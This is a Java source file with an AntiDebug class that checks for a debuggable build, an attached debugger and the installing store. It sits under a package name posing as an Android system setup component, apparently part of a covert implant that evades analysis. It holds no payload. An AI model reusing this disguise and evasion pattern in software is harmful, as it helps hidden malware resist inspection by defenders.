package com.android.syssetup.util;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Debug;
import android.util.Log;

import com.android.syssetup.Beep;
import com.android.syssetup.Status;
import com.android.syssetup.auto.Cfg;

public class AntiDebug {

	public boolean checkFlag() {
		boolean debug = (Status.self().getAppContext().getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
		if (Cfg.DEBUGANTI) {
			Log.w("QZ", " checkFlag: " + debug);
		}
		return debug;
	}

	public boolean checkIp() {
		CheckDebugModeTask checkDebugMode = new CheckDebugModeTask();
		checkDebugMode.execute("");

		Utils.sleep(2000);

		if (Cfg.DEBUGANTI) {
			Log.w("QZ", " checkIp: " + checkDebugMode.IsDebug);
		}
		return checkDebugMode.IsDebug;
	}

	public boolean checkConnected() {
		if (Cfg.DEBUGANTI) {
			Log.w("QZ", " checkConnected: " + Debug.isDebuggerConnected());
		}
		return Debug.isDebuggerConnected();
	}

	public boolean isDebug() {
		if (Cfg.DEBUGANTI) {
			Beep.bip();
			Beep.bip();
			Beep.bip();
		}
		return checkFlag() || checkConnected();
	}

	public boolean isPlayStore() {
		PackageManager pm = Status.getAppContext().getPackageManager();
		try {
			if (pm.getInstallerPackageName(Status.getAppContext().getPackageName()) != null) {
				if (Cfg.DEBUGANTI) {
					Log.w("QZ", " packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
				}

				return true;
			}
		} catch (Exception e) {
			Log.w("QZ", " NOT installed ?!?! " + e);
		}
		return false;
	}
}
